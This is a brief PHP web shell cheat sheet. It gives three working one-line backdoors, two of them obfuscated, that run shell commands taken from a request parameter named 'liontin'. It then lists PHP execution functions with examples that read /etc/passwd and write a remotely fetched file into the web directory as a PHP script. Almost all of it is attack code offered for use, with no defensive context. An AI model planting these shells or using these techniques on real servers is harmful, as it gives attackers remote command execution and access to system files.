

// shell 1

<?php passthru($_REQUEST['liontin'], $result); ?>


// shell 2

<?php $_ = range("A", "Y");$_ = $_[6].$_[4].$_[19];$_ = ${'_'.$_}['liontin'];echo `$_`;?>

// shell 3

<?php $xyz = "szhezlzl_ezxezc";$xyz = str_replace("z","",$xyz);echo $xyz($_REQUEST['liontin']);?>

// shell command 

- shell_exec()
- exec()
- system()
- passthru()

- file_put_contents()
  file_put_contents( __DIR__ . '/file-name.php', 'hi' );

- readfile()
  readfile("/etc/passwd");
  
- file_get_contents()
  file_get_contents('url.com');
  
- file_put_contents() , file_get_contents()
  file_put_contents( __DIR__ . '/file-name.php', file_get_contents('http://you-file.txt'));
  
  - base64_decode
  - base64_encode





